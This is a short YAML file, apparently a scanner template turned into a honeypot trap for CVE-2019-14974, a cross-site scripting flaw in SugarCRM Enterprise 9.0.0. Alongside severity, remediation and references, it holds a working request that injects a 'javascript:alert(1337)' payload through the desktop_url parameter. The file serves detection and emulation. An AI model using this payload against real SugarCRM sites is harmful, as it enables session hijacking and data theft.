id: CVE-2019-14974
info:
  name: SugarCRM Enterprise 9.0.0 - Cross-Site Scripting
  author: madrobot
  description: SugarCRM Enterprise 9.0.0 contains a cross-site scripting vulnerability
    via mobile/error-not-supported-platform.html?desktop_url.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Apply the latest security patch or upgrade to a non-vulnerable version
    of SugarCRM Enterprise.

    '
  reference:
  - https://www.exploit-db.com/exploits/47247
  - https://nvd.nist.gov/vuln/detail/CVE-2019-14974
  - https://github.com/anonymous364872/Rapier_Tool
  - https://github.com/merlinepedra/nuclei-templates
  - https://github.com/merlinepedra25/nuclei-templates
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2019-14974
    cwe-id: CWE-79
    epss-score: 0.00217
    epss-percentile: 0.5978
    cpe: cpe:2.3:a:sugarcrm:sugarcrm:9.0.0:*:*:*:enterprise:*:*:*
  metadata:
    max-request: 1
    vendor: sugarcrm
    product: sugarcrm
  tags: cve,cve2019,xss,sugarcrm,edb
traps:
- request:
    method: GET
    path: /mobile/error-not-supported-platform.html?desktop_url=javascript:alert(1337);//itms://
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: url = window.location.search.split("?desktop_url=")[1]
